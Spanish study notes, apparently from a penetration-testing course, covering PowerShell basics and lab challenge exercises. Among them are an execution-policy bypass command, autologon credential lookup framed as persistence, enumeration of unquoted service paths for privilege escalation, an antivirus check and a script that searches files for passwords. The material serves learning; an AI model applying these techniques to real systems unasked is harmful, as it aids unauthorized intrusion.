El ejemplo anterior repite desde 0 hasta 4 escalando una cada vez un bloque de código mostrando que además, en cada iteración la variable $myVar cambia cada vez. El bucle termina cuando la condición que ocupa el puesto de 2º parámetro se cumple, es decir, cuando $myVar es igual o mayor que 5.

Una variación que tiene más flexibilidad y usos más prácticos del bucle for sería el 'foreach', que selecciona un objeto de un conjunto de objetos y realiza algo con él para todos los elementos del conjunto:

```powershell
PS C:\WINDOWS\system32> $myWord = "powershell"

PS C:\WINDOWS\system32> $myArray = $myWord.ToCharArray()

PS C:\WINDOWS\system32> foreach ($myLetter in $myArray)
{
  $myLetter
}
p
o
w
e
r
s
h
e
l
l
```

Para entender este ejemplo es conveniente saber que el método *.ToCharArray()* convierte un String (técnicamente cadena de caracteres) en un objeto array cuyas casillas son los caracteres que componen el string.

El bucle While, como comentábamos al principio sigue el mismo principio del bucle For, sin embargo está orientado a la repetición de un bucle de código hasta que se cumple una condición sin la necesidad de saber exactamente cuántas repeticiones de código serán. 

La sintaxis es:

```powershell
while (<condition>)
  {
	  <code>
  }
```

Por ejemplo:

```powershell
 $count = 0;
1  while ($count -lt 5)
2  {
3    if ($count -eq 1)
4    {
5      break;
6    }
7    $count;
8    $count++;
9  }
```



Observemos que el incremento de 'count' (al contrario de lo que ocurría en el bucle for) está especificado dentro del código pero su presencia  no es una condición necesaria y eso convertiría al bucle en un bucle sin fin.

Una forma más concreta del bucle while infinito es el siguiente:

```powershell
while ($True)
{
  <code>
}
```

Este tipo de bucle es muy útil en diversas situaciones y conviene tenerlo en mente.

A veces la condición puede ser una señal para parar el bucle:

```powershell
$words = "powershell","offensive","security","hacker","scripting","forensics","pentest"
foreach ($word in $words)
{
  if ($word -eq "hacker")
  {
    break
  }
  Write-Output $word
}
```


<br />

#### 2.3. PowerShell Propierties and Methods.

**Definición de propiedades y métodos.**

Como hemos comentado al principio, la funcionalidad de PowerShell reside en CmdLets que trabajan sobre objetos, instancias de clases. Asociados al manejo de las clases podemos encontrar las *Propiedades* y los *Métodos*. 

Una propiedad es una característica o atributo de una clase que toma un valor concreto en un objeto caracterizándolo. Por otra parte, un método es una acción de código asociada a dicho objeto.

<br />

**Accediendo a las propiedades y métodos de un objeto.**

Podemos acceder a ambos elementos mediante el CmdLet 'Get-Member' en conjunción con un operador 'pipe'. 

Como ejemplo, podemos designar una variable. Una variable es efectivamente una instancia de la clase Variable, un objeto, que tiene propiedades y métodos, veámoslos. Supongámos que tenemos la variable $Var = "Christina", entonces:

```
PS C:\WINDOWS\system32> $Var | Get-Member

    TypeName: Sytem.String

Name                MemberType      Definition
----                ----------      ----------
Clone               Method          System.Object Clone(), System.Object ICloneable.Clone()
... 
GetType             Method          type GetType()
...
ToCharArray         Method          char IConvertible.ToChar(System.IFormatProvider provider)
...
Length              Property        int Length {get;}
```


Aquí podemos observar unos pocos pero la realidad es que esta es una variable tipo String y tiene muchos métodos y propiedades disponibiles. 

Para usar un método o ver una propiedad sobre una acción siempre utilizamos un punto (.) después del nombre del objeto. Por ejemplo:

```powershell
PS C:\WINDOWS\system32> $Var
Christina

PS C:\WINDOWS\system32> $Var.ToLower()
christina

PS C:\WINDOWS\system32> $Var.Length
9
```

Observamos que ambos son funciones que se aplican sobre el objeto, ya sea para obtener una característica suya o para utilizar su contenido con algún propósito. La diferencia sintactica entre un método y una propiedad es que el método tiene paréntesis.

<br />

**Ejercicios**

¿Cuántos métodos tiene el cmdlet Get-ScheduledTask?

```powershell
Get-ScheduledTask | Get-Member -MemberType Method | Measure-Object -Line
```

9

<br />

En orden alfabético, lista las dos propiedades que contienen la palabra "Write" en el nombre del cmdlet Get-ChildItem.

```powershell
Get-ChildItem | Get-Member -MemberType Property -Name "*write*"
```

LastWriteTime, LastWriteTimeUtc

<br />

#### 2.4. Filtering and Fromatting. 

Antes hemos visto que PowerShell consta de objetos que tienen asociada una gran multitud de información asociada. Ahora vamos a aprender a cómo desplegar exactamente la información que necesitamos de una entidad concreta.

<br />

**Select-Object**

Select-Object es un CmdLet que nos permite seleccionar una propiedad de uno o más objetos. Continuando con los ejemplos anteriores:

```powershell
PS C:\WINDOWS\system32> $Var | Select-Object -Property Length

Length
------
9

PS C:\WINDOWS\system32> $Var.Length

9
```

Debemos saber que, aunque en principio el output esa igual, la forma en la trabajan ambos comandos es distinta y muchas veces no proporcionarán los mismos resultados. 

Otro ejemplo de uso sería con Get-Service. Get-Service es un CmdLet que lista los servicios instalados en el sistema Windows, es un cmdlet especialmente importante debido a que puede conducir a un pentester a potenciales vectores de ataque de distinta índole:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221210135959.png' | relative_url }}" text-align="center"/>
</div>

Para listar servicios debemos ser administrador. Si cruzamos el display anterior con Get-Member obtendríamos el siguiente resultado:

```powershell
PS C:\WINDOWS\system32> Get-Service | Get-Member
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221210140122.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar que se despliegan múltiples métodos y propiedades asociados al objeto Get-Service en formato de tabla. Pero otra forma de obtener esta información es cruzando Get-Services y obteniendo sólo una serie de proppiedades deseadas:

```powershell
Get-Service | Select-Object -Property "DisplayName","MachineName","ServiceType","StartType","Status"
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221210140812.png' | relative_url }}" text-align="center"/>
</div>

Aquí podemos ver que se muestra en formato de Lista que es más manejablen y además sólo muestra la información pedida que es en esencia la que queremos saber.

<br />

**Sort-Object**

Sort-Object es un cmdlet que nos permite ordenar la información mostrada en base a una propiedad u objeto. Por ejemplo, supongámos que queremos mostrar los servicios en función de su status en orden descendente, esto es; running, stop, etc:

```powershell
PS C:\WINDOWS\system32> Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221210142245.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Where-Object**

Where-Object nos permite filtrar por un parámetro que tiene un valor dado. Por ejemplo, supongámos que de los servicios listados anteriormente sólo nos interesan aquellos que que empiezan al ejecutarse la máquina o que empiezan 'automáticamente':

```powershell
PS C:\WINDOWS\system32> Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object StartType -EQ Automatic
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221210143629.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Format-Table/List**

Format-Table o Format-List son comandos que formatean el output o bien en tabla o bien en forma de lista, por ejemplo:

```powershell
PS C:\WINDOWS\system32> Get-Service | Select-Object -Property ServiceName,DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object {$_.StartType -EQ "Automatic" -And $_.ServiceName -Match "^s"} | Format-Table
```

Este comando, además de filtrar el nombre del servicio de acuerdo a una expresión regular para que sólo presente aquellos servicios que empiecen por 's' despliega el output en forma de Tabla, es decir, filas y columnas:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221210181440.png' | relative_url }}" text-align="center"/>
</div>

Existen más formatos aunque sólo estemos presentando estos dos.

<br />

**Get-PSProvider, Get/Set/New-Item, Get/Set/New-ItemProperty**

Los *providers* son contenedores del marco .NET que facilitan el acceso a ciertos tipos de datos. Podemos ver una lista del providers actuales ejecutando Get-PSProvider:

```powershell
PS C:\WINDOWS\system32> Get-PSProvider

Name          Capabilities                          Drives
----          ------------                          ------
Registry      ShouldProcess, Transactions           {HKLM, HKCU}
Alias         ShouldProcess                         {Alias}
Environment   ShouldProcess                         {Env}
FileSystem    Filter, ShouldProcess, Credentials    {C, A, D}
Function      ShouldProcess                         {Function}
Variable      ShouldProcess                         {Variable}
```

Podemos ver los objetos asociados a cada clase con Get-Item o directamente navegando al contenender con cd:

```powershell
PS C:\WINDOWS\system32> Get-Item alias:

CommandType     Name                             Version    Source
-----------     ----                             -------    ------
Alias           foreach -> ForEach-Objec
Alias           % -> ForEach-Objec
Alias           where -> Where-Objec
Alias           ? -> Where-Objec
Alias           ac -> Add-Content
Alias           clc -> Clear-Content
Alias           cli -> Clear-Item
Alias           clp -> Clear-ItemProperty
Alias           clv -> Clear-Variable
Alias           compare -> Compare-Objec
Alias           cpi -> Copy-Item
Alias           cpp -> Copy-ItemProperty
Alias           cvpa -> Convert-Path
Alias           dbp -> Disable-PSBreakpoin
Alias           diff -> Compare-Objec
...

PS C:\WINDOWS\system32> cd Alias:; ls

CommandType     Name                             Version    Source
-----------     ----                             -------    ------
Alias           foreach -> ForEach-Objec
Alias           % -> ForEach-Objec
Alias           where -> Where-Objec
Alias           ? -> Where-Objec
Alias           ac -> Add-Content
Alias           clc -> Clear-Content
Alias           cli -> Clear-Item
Alias           clp -> Clear-ItemProperty
Alias           clv -> Clear-Variable
Alias           compare -> Compare-Objec
Alias           cpi -> Copy-Item
Alias           cpp -> Copy-ItemProperty
Alias           cvpa -> Convert-Path
Alias           dbp -> Disable-PSBreakpoin
Alias           diff -> Compare-Objec
...
```

Y vemos todos los alias y a qué comando sustituyen. Así por ejemplo, 'ls', 'dir' son ambos alias de Get-ChildItem que lista los contenidos del directorio actual. Observemos que el propio directorio C es un provider.

<br />

##### 2.4.2. PowerShell Functions.

**Definición y creación de funciones**

Las funciones son piezas de código que podemos invocar. Están pensadas para reciclar bloques de código.

Para poder definir una función hay que escribilar la siguiente sintaxis:

```powershell
PS C:\Windows\system32> function <functionname> {
 
  <code>

}
```

<br />

```powershell
PS C:\Windows\system32> function Get-MajMinorVersion {
  $PSVersionTable.PSVersion.Major.ToString()+"."+$PSVersionTable.PSVersion.Minor.ToString()
}

PS C:\Windows\system32> Get-MajMinorVersion
5.1
```

<br />

**Scope modifiers**

El scope o alcance de una variable determina hasta qué punto existe una variable en un código. Existen variables que sólo tienen valor o existencia dentro de un bloque de código y tienen alcance local y existen variables que existen en todo el código y que tienen por tanto un alcance global.

Así por ejemplo podemos usar los términos Global o Local para determinar el alcance de una variable que creemos:

```powershell
PS C:\Windows\system32> $Global:outsideVariable = "outside"

PS C:\Windows\system32> function Set-PSInsideVar
{
  $Local:insideVariable = "inside"
  Write-Output $insideVariable
}
```

La sintaxis por tanto es:

```powershell
$<scope-modifier>:<name> = <value>
```

Así, observamos que la variable local no existe fuera del bloque de código de la función.

```powershell
PS C:\Windows\system32> Write-Output $outsideVariable
outside

PS C:\Windows\system32> Set-PSInsideVar
inside

PS C:\Windows\system32> Write-Output $insideVariable

PS C:\Windows\system32>
```

<br />

**Get-Variable**

Podemos identificar todas las variables, locales o globales con Get-Variable:

```powershell
PS C:\Windows\system32> Get-Variable -Scope Global -Name outsideVariable

Name                                Value
----                                _____
outsideVariable                      outside

PS C:\Windows\system32> Get-Variable -Scope Global -Name insideVariable
Get-Variable : Cannot find a variable with the name 'insideVariable'.
At line:1 char:1
+ Get-Variable -Scope Global -Name insideVariable
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (insideVariable:string) [Get-Variable], ItemNotFoundExepction
    + FullyQualifiedErrorID : VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand

PS C:\Windows\system32> Get-Variable -Scope Local -Name insideVariable
Get-Variable : Cannot find a variable with the name 'insideVariable'.
At line:1 char:1
+ Get-Variable -Scope Local -Name insideVariable
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (insideVariable:string) [Get-Variable], ItemNotFoundExepction
    + FullyQualifiedErrorID : VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand

```

Observamos que, aunque intentamos buscar una variable local, esta no existe y por tanto no puede ser encontrada a noser que se busque desde el bloque de código en el que fue creada:

```powershell
PS C:\Windows\system32> function Set-PSInsideVar
{
  $Local:insideVariable = "inside"
  Write-Output $insideVariable
  Get-Variable -Scope Local -Name insideVariable
}

PS C:\Windows\system32> Set-PSInsideVar
inside

Name                                Value
----                                _____
insideVariable                       inside
```

<br />

**Parámetros de las funciones**

Las funciones pueden ser llamadas juntos con parámetros, estos son valores que se añaden al código de la función de forma externa y que generalmente varian el comportamiento y resultado de la función.

Hay dos formas de definir los parámetros de una función:

```powershell
function <name>
{
  param ([type]$parameter1, [type]$parameter2)
  <actions>
}

function <name> ([type]$parameter1, [type]$parameter2)
{
  <actions>
}
```

Por ejemplo:

```powershell
PS C:\Windows\system32> function Get-PSMultiplication
{
  param ([int]$num1, [int]$num2)
  return $num1*$num2
}

PS C:\Windows\system32> Get-PSMultiplication 2 10
20
```

En cualquier caso, a la hora de llamar a una función, los parámetros siempre se introducen como argumentos a la hora de llamarla.

<br />

**Ejercicios**

Sobre el siguente bloque de código:

```
function Get-PSMath
{
  param ([int]$num1, [int]$num2, [string]$str1)
  if($str1 -eq "*")
  {
    return $num1*$num2
  }
  else if($str1 -eq "+")
  {
    return $num1+$num2
  }
  else if($str1 -eq "/")
  {
    return $num1/$num2
  }
  else if($str1 -eq "-")
  {
    return $num1-$num2
  }
  else
  {
    break
  }
}
```

¿Cuántos parámetros contiene la función anterior?: 3
¿Qué generará el siguiente comando, Get-PSMath 2 10 +, Get-PSMath 10 5 !?: 12, una línea en blanco.

<br />

##### 2.4.3. Scripts, Modulos.

**Definición y política de restricción.**

Los scripts en powershell son ficheros *.ps1*. PowerShell mantiene una política de restricción en contra de la ejecución de scripts como medida de seguridad.

Podemos ver el status de esta medida con el siguiente comando:

```powershell
PS C:\Users\User> Get-ExecutionPolicy
Restricted
```

<br />

```powershell
PS C:\Users\User> C:\Users\User\Desktop\computerInfo.ps1
C:\Users\User\Desktop\computerInfo.ps1 : File C:\Users\User\Desktop\computerInfo.ps1 cannot be loaded
because running scripts is disabled on this system. For more information, see about_Execution_Policies at
https:/go.microsoft.com/fwlink/?LinkID=135170.
```

Generalmente esta configuración no se puede cambiar a no ser que seamos administradores. Sin embargo, existen otras configuraciones y comandos que nos pueden introducir:

```powershell
PS C:\Users\vandelay> powershell.exe -exec bypass C:\Users\vandelay\Desktop\computerInfo.ps1
```

<br />

**Comentarios**

Los comentarios se indican con un hastag '#'. 

```powershell
# This is a single line comment. The interpreter will ignore this comment.

<#
  This is a multi-line comment or a comment code block.
  Every line within this section will be ignored by the interpreter
#>

# The following function takes in two integers (num1 and num2) as input, multiplies them together, and outputs the total.

function Get-PSMultiplication
{
  param ([int]$num1, [int]$num2)
  return $num1*num2
}
```

<br />

**Modulos**

Los módulos de PowerShell son esencialmente paquetes que contienes cmdlets adicionales, funciones, providers, etc. Estos son generalmente importados a una sesión concreta de PowerShell dando acceso al usuario a nueva funcionalidad.

Una forma de listar los modulos es con *Get-Module*:

```powershell
PS C:\Windows\system32> Get-Module -ListAvailable

    Directory: C:\Program Files\WindowsPowerShell\Modules

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     1.0.1      Microsoft.PowerShell.Operation.V... {Get-OperationValidation, Invoke-OperationValidation}
Binary     1.0.0.1    PackageManagement                   {Find-Package, Get-Package, Get-PackageProvider, Get-Packa...
Script     3.4.0      Pester                              {Describe, Context, It, Should...}
Script     1.0.0.1    PowerShellGet                       {Install-Module, Find-Module, Save-Module, Update-Module...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Set-PSReadLineKeyHandler, Remov...

    Directory: C:\Windows\system32\WindowsPowerShell\v1.0\Modules

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.0.0    AppBackgroundTask                   {Disable-AppBackgroundTaskDiagnosticLog, Enable-AppBackgro...
Manifest   2.0.0.0    AppLocker                           {Get-AppLockerFileInformation, Get-AppLockerPolicy, New-Ap...
Manifest   1.0.0.0    AppvClient                          {Add-AppvClientConnectionGroup, Add-AppvClientPackage, Add...
Manifest   2.0.1.0    Appx                                {Add-AppxPackage, Get-AppxPackage, Get-AppxPackageManifest...
Script     1.0.0.0    AssignedAccess                      {Clear-AssignedAccess, Get-AssignedAccess, Set-AssignedAcc...
...
```

<br />

**Get-Command**

Una vez hemos importado un modulo, hemos adquirido nuevas funcionalidades como comandos, etc. Podemos ver estas nuevas funcionalidades con *Get-Command*

```powershell
PS C:\Windows\system32> Get-Command -Module Defender

CommandType     Name                          Version    Source
-----------     ----                          -------    ------
Function        Add-MpPreference              1.0        defender
Function        Get-MpComputerStatus          1.0        defender
Function        Get-MpPreference              1.0        defender
Function        Get-MpThreat                  1.0        defender
Function        Get-MpThreatCatalog           1.0        defender
Function        Get-MpThreatDetection         1.0        defender
Function        Remove-MpPreference           1.0        defender
Function        Remove-MpThreat               1.0        defender
Function        Set-MpPreference              1.0        defender
Function        Start-MpScan                  1.0        defender
Function        Start-MpWDOScan               1.0        defender
Function        Update-MpSignature            1.0        defender
```

<br />

**Exercises**

¿Cuál es la primera función listada alfabéticamente disponible a través del módulo BitLocker?:

Import-Module BitLocker; Get-Command -Module BitLocker

Add-BitLockerKeyProtector

<br />

¿Cuál es la primera entrada después de ejecutar Get-ChildItem en el proveedor de certificados en LocalMachine?

```powershell
cd Cert:\LocalMachine\; Get-ChildItem
```

TestSignRoot

<br />

¿Qué cmdlet podríamos usar para que PowerShell lea en un archivo CSV (valores separados por comas)?

Import-CSV

<br />

#### 2.5. Challenge Exercises.

**1. Las credenciales de inicio de sesión automático a veces se pueden almacenar en ciertos lugares dentro del disco duro. Como operador ofensivo, esta es una excelente manera de obtener persistencia. Encuentre todas las credenciales de inicio de sesión automático obteniendo la propiedad del elemento de "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" y mostrando los valores "DefaultDomainName" y "DefaultUserName".**

Como vemos en el enunciado, existen credenciales de autologeo, estas credenciales permiten al usuario que tiene propiedad sobre ellas logearse en el equipo sin necesidad de autenticarse. 

Tal y como comenta el enunciado, podemos tener acceso a todas estas claves utilizando el cmdlet Get-ItemProperty sobre Winlogon en el registro clave de la máquina local o HKLM:

```powershell
Get-ItemProperty -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object -Property DefaultDomainName,DefaultUserName,PSDrive
```

Como el output no despliega ningún usuario en ningún dominio, asumimos que esta máquina no tiene claves de autologeo.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221211012345.png' | relative_url }}" text-align="center"/>
</div>

<br />

**2. Encontrar los SID del usuario puede ser una buena información por varias razones. Utilice PowerShell para encontrar el SID del administrador. Asegúrate de incluir toda la cadena.**

El SID es un identificador de seguridad, un número que se asigna a cada usuario en la máquina windows. Se trata por tanto de una propiedad de un usuario local y para acceder a ella vamos a utilizar el cmdlet *Get-LocalUser*; este es un cmdlet que permite acceder a los objetos usuarios locales de la máquina:

```powershell
Get-LocalUser -Name "Administrator" | Select-Object -Property Name,SID
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221211013102.png' | relative_url }}" text-align="center"/>
</div>

<br />

**3. Identificar si un antivirus está instalado y qué versiones son es una habilidad crucial como operador ofensivo. Desde el lado defensivo o administrativo, es una buena información que ayuda a identificar brechas de seguridad. ¿Cuál es el estado del producto del antivirus instalado?**

Para este ejercicio vamos a utilizar el cmdlet Get-CIMInstance. Este es un cmdlet que extrae información sobre un servidor CIM (Common Information Model), este último es un modelo de datos orientado a objetos que con frecuencia contiene información de distintas partes de un sistema o una empresa como por ejemplo un antivirus, que puede ser software interno o de terceros.

El CIM se organiza por su parte en 'namespace', los cuales son directorios lógicos organizados en un sistema de ficheros.

```powershell
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

En el comando anterior podemos ver por tanto que estamos buscando en root/SecurityCenter2 la clase AntivirusProduct:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221211015927.png' | relative_url }}" text-align="center"/>
</div>

<br />

**4. En formato de tabla, muestre los procesos e incluya CommandLine, ProcessName y SessionID. Filtre para mostrar SessionID de 2 y ProcessName de "svchost.exe" solamente. Ordene los resultados alfabéticamente por CommandLine. La primera fila tendrá un comando "SvcGroup" diferente. Envíe el valor completo de la propiedad CommandLine de ese proceso.**

En primer lugar, podemos intentar utilizar el cmdlet Get-Process, a la vista de que este lista los procesos del sistema

```powershell
Get-Process | Select-Object CommandLine,SessionID,ProcessName | Where-Object {$_.SessionID -eq 2 -And $_.ProcessName -eq "svchost"} | Sort-Object -Property CommandLine -Descending
```

Esta, en teoría lista todos los procesos, segudamente selecciona las propiedades CommandLine, SessionID y ProcessName, seguidamente, se queda con aquellas lineas donde Session ID coincida con 2 y ProcessName coincida con "svchost" y ordena por orden alfabéticamente descendente las líneas a partir de la propiedad CommandLine. 

Sin embargo, esta línea no despliega un output que contenga CommandLine:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221211121243.png' | relative_url }}" text-align="center"/>
</div>

Así, tenemos que buscar otra forma de listar los procesos. Buscando en internet podemos encontrar que el CmdLet, Get-CimInstance Win32_Process lista todos los procesos del sistema:

```powershell
Get-CimInstance Win32_Process | Select-Object CommandLine,SessionID,ProcessName | Where-Object {$_.SessionId -eq 2 -and $_.ProcessName -eq "svchost.exe"} | Sort-Object -Property CommandLine -Descending
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221211122437.png' | relative_url }}" text-align="center"/>
</div>

Como está organizado de forma descendente, el comando pedido es el último.

<br />

**5. Cuente la cantidad de tareas programadas con la ruta del directorio "\\Microsoft" (para incluir todos los subdirectorios) y en el state "Ready".**

Para este ejercicio vamos a utillizar Get-ScheduledTask que muestra todas las tareas automatizadas que hay en el registro. Para ello empleamos el siguente comando:

```powershell
Get-ScheduledTask -TaskPath "\Microsoft*" | Where-Object -Property State -eq "Ready" | Measure-Object -Line
```

Este lista todos los ScheduledTask que empiezen por \\Microsoft (el asterisco es un término que se utiliza para designar que después puede ir cualquier cosa) y después se queda con todos aquellos que tengan el status "Ready" y por último cuenta las líneas. 

Es importante ejecutar el comando como adminstrador ya que como el cmdlet trabaja con los permisos del usuario que lo lanza, es probable que haya secciones del registro al que un usuario normal no pueda acceder y que por tanto queden tareas sin listar.

<br />

**Los servicios con rutas ejecutables sin comillas que se inician automáticamente pueden dar lugar a una escalada de privilegios. ¿Cuántos servicios se ajustan a esa descripción en esta máquina?**

En principio intentamos listar servicios con Get-Service pero este no muestra ninguna propiedad relacionada con un binario ejecutable o algo parecido.

Así , probamos a utilizar el cmdlet Get-WmiObject el cual nos permite listar objetos pertenicientes a una determinada clase, entre las clases listables se encuentra Win32_Service. Primero, listamos todas las propiedades de los objetos con:

```powershell
Get-WmiObject Win32-Service | Select-Object -Property *
```

Observamos que entre las propiedades que se listan hay una que se denomina "PathName" y que tiene elpath al ejecutable del servicio. Despúes de realizar diversas pruebas el comando a emplear es:

```powershell
Get-WmiObject Win32_Service | Select-Object Name,StartMode,PathName | Where-Object {$_.StartMode -eq "Auto" -and $_.PathName -NotMatch '"'} | Measure-Object 
```

Este comando lista los servicios de windows, muestra las propiedaes Name, StartMode, PathName pero filtra todo lo que no coincida con StartMode = Auto y todo aquello que tenga comillas.

<br />

**Con los resultados de la pregunta 6 (antes de contar los objetos), ajuste su solución agregando las propiedades Name y DisplayName, y ordene los resultados alfabéticamente en orden descendente según la propiedad "Name". La respuesta son los valores de las propiedades First Name y DisplayName del servicio que comienzan con la letra "p".**

Ajustamos el comando anterior para que quede como sigue:

```powershell
Get-WmiObject Win32_Service | Select-Object Name,DisplayName,StartMode,PathName | Where-Object {$_.StartMode -eq "Auto" -and $_.PathName -NotMatch '"'} | Sort-Object -Property Name -Descending
```

Este comando es similar al anterior salvo que muestra también la propiedad DisplayName y ordena los elementos alfábéticamente descendiente, el primer servicio que tiene en común que Name y Display Name empieza por 'p' es Power. Por tanto la respuesta es Power,Power.

<br />

**Hay un usuario que inició sesión. Use PowerShell para encontrar el valor de PrimaryOwnerName del usuario.**

Podemos listar la clase Win32_ComputerSystem que lista los ordenadores que están conectados al sistema, al lista todas las propiedades obtenemos:

```powershell
Get-CimInstance -ClassName Win32_ComputerSystem
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221211181026.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Obtener hashes de archivos es extremadamente importante para defensores y analistas forenses. Hay un archivo ubicado en C:\\Windows\\System32 (no subdirectorios) con un hash MD5 de "6CECC33A62E935F5E8665B9597479A36". ¿Cuál es el nombre del archivo (incluya la extensión)?**

Para desarrollar esta tarea vamos a utilizar el siguiente script:

```powershell
$Files=$(Get-ChildItem | Where-Object { ! $_.PSIsContainer } | Select-Object -ExpandProperty Name) 

$Flaghash="6CECC33A62E935F5E8665B9597479A36"

for ($i=0; $i -le $Files.Length; $i++){
    $File=$files[$i]
    $Path="C:\WINDOWS\system32\"+$File
    $Hash=$(Get-FileHash $Path -Algorithm MD5 | Select-Object -ExpandProperty Hash )	
	if ($Hash -eq $Flaghash){
		$Files[$i] 
	}
	else
	{}
}
```

Veámos línea a línea lo que hace el script.

- La primera línea guarda en una variable el resultado de un comando que lista los contenidos del directorio actual, desecha los subdirectorios, y se queda con el string asociado al valor de la propiedad Name del fichero (es decir, crea una variable array que contiene los nombres de los ficheros del directorio actual). Especialemente relevante es el término -ExpandProperty que nos permite quedarnos sólo con el string, en lugar de quedarnos con la propiedad Name solamente como ocurriría con -Property solamente. Esto imposibilitaria la construcción del path que vamos a hacer acontinuación.

- La segunda línea guarda en una variable el contenido del fichero cuyo nombre queremos.

- La tercera implementa el inicio de un bucle for que esencialmente construye un path para cada nombre del fichero contenido en el array anterior y extrae el hash del contenido de dicho fichero y compara este hash con nuestra flag. Si hay un match despliega el nombre del fichero que es lo que pide el ejercicio. Observemos que para comprar los hashes hemos vuelto a utilizar -ExpandProperty y que para formar el path hemos utilizado el operador '+' con dos strings.

<br />

**Consultar archivos en busca de cadenas o caracteres es una habilidad invaluable que se puede aplicar en una variedad de campos dentro de la seguridad de la información y la informática en general. Hay un archivo .txt ubicado en C:\\Windows\\System32 (incluye subdirectorios) que contiene la cadena "contraseña". Encuentre el archivo y recupere el contenido del archivo para obtener la bandera. Según el comando, puede tardar uno o dos minutos. Si lleva más de tres minutos, deberíamos considerar volver a evaluar nuestra solución.**

Para realizar esta tarea vamos a utilizar el siguiente script:

```powershell
$Files=$(Get-ChildItem | Where-Object { $_.Name -match "txt" } | Select-Object -ExpandProperty Name) 

for ($i=0; $i -lt $files.Length; $i++){
    $File=$Files[$i]
    $Path="C:\WINDOWS\system32\"+$File
    $Pattern=$(Get-Content $Path | Select-String -Pattern "password" )	
	if ($Pattern -ne $null){
		"[+] " + $Path + ": " + $(type $Path | Select-String -Pattern "password")
	}
	else
	{}
}
```

Este es producto de una reutilización del código del ejercicio anterior. De nuevo, vamos a desgranar el script línea a línea.

- La primera línea crea un array con los nombres de los ficheros que contienen el término 'txt' en el nombre. De nuevo, utilizamos el -ExpandProperty para quedarnos con el string del nombre en lugar de con la propiedad Name.

- La siguiente línea forma un bucle for que, para cada nombre, forma la ruta hasta el fichero y seguidamente busca entre sus contenidos el patrón 'password' y lo almacena en una variable. Si encuentra un match, la variable no estará vacía y nos dará la línea en la que a encontrado el match.

<br />

### 3. Windows Networking & Services.
#### 3.1. Essentials Network Utilities.

##### 3.1.1. Abriendo una cmd como admin.

Para comenzar, vamos a utilizar el Protocolo de escritorio remoto (RDP) para conectarnos a la máquina remota de Windows. Desde su Kali VM, abra una terminal y ejecute el siguiente comando: rdesktop <dirección IP>.

La dirección IP entre corchetes será la dirección IP de la máquina virtual de Windows y será diferente para cada estudiante. Por ejemplo, el comando debería parecerse a este rdesktop 1.2.3.4 , pero su dirección IP corresponderá a su dirección IP específica de la VM de ejercicio de Windows.

```
kali@kali:~$ rdesktop 1.1.1.1

```

Ahora abramos una terminal CLI. Hay muchas maneras de hacer esto, pero vamos a cubrir dos métodos diferentes. Algunos de estos comandos pueden requerir privilegios elevados que un usuario normal podría no tener.

Para mantener esto simple, vamos a usar la terminal CLI con privilegios administrativos. Dependiendo de la configuración de la computadora, es posible que debamos proporcionar la contraseña de administrador.

Hay dos maneras de hacer esto como se describe a continuación.

La primera forma es abrir un explorador de Windows y buscar C:\\Windows\\System32. Allí, encontramos el ejecutable llamado *conhost.exe* , le damos clic derecho y seleccionamos *Ejecutar como administrador*.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230130131124.png' | relative_url }}" text-align="center"/>
</div>

El segundo método es hacer clic en el menú Inicio en la esquina inferior izquierda de la pantalla. Escribimos "símbolo del sistema", lo que activará la función de búsqueda dentro de Windows. Luego, damos clic derecho sobre *Símbolo del sistema* y seleccionamos *Ejecutar como administrador*.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230130131208.png' | relative_url }}" text-align="center"/>
</div>

Ambas técnicas abren la terminal CLI, que debería tener un aspecto similar a este.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230130131222.png' | relative_url }}" text-align="center"/>
</div>

Aquí es donde interactuaremos con el sistema usando las utilidades de red. En las siguientes secciones, desglosaremos las características principales de cada utilidad, seguidas de algunos ejercicios.

Estas utilidades son muy poderosas y tienen demasiadas opciones de comando para cubrir. Después de familiarizarse con los conceptos básicos, es importante experimentar y aprender acerca de las funciones adicionales dentro de cada comando. Hay muchos recursos excelentes en línea para estudiantes que desean aprender más.

Algunas de las herramientas requeridas también estarán ubicadas en una carpeta llamada Herramientas en el Escritorio del usuario "offensive".

<br />

##### 3.1.2. Basic System and Network Commands (ipconfig, systeminfo, set, setx)

**Ipconfig**

